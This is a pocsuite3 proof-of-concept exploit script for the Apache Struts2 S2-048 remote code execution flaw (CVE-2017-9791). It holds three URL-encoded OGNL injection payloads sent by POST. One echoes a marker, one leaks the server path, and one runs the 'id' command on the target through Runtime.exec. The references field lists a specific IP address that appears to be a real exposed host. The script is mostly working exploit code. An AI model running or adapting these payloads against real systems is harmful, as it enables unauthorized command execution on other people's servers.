# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = "CVE-2017-9791"
    version ='1'
    author = ["LMX"]
    vulDate = "2017-07-07"
    createDate = "2022-2-2"
    updateDate = "2022-2-2"
    references =["http://5.249.156.94:8080/etrackweb/loginAction.action"]
    name ="S2-048 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Strute2'
    appVersion = '2.3.x'
    vulType = 'RCE'
    desc = '''
    struts2-048远程代码执行漏洞
    '''

    def _verify(self):
        result ={}
        payload = '''name=%25%7B%28%23nike%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23o%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%29.%28%23o.println%28%27%5B%27%2B%27tttpppppp%27%2B%27111%5D%27%29%29.%28%23o.close%28%29%29%7D&age=1&__checkbox_bustedBefore=true&description=1'''
        payload_2 = '''name=%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23o%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%29.%28%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23path%3d%23req.getRealPath%28%27%2f%27%29%29.%28%23o.println%28%23path%29%29.%28%23o.close%28%29%29%7d&age=1&__checkbox_bustedBefore=true&description=1'''
        payload_3 = '''name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29.%28%23q%29%7D&age=1&__checkbox_bustedBefore=true&description=1'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        url = self.url
        r = requests.post(url=self.url,headers=headers,data=payload)
        rr = requests.post(url=self.url,headers=headers,data=payload_2)
        rrr = requests.post(url=self.url,headers=headers,data=payload_3)
        try:
            if '[tttpppppp111]' in r.text or '/webapps' in rr.text or 'uid=' in rrr.text or 'uid%3D' in rrr.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC) 
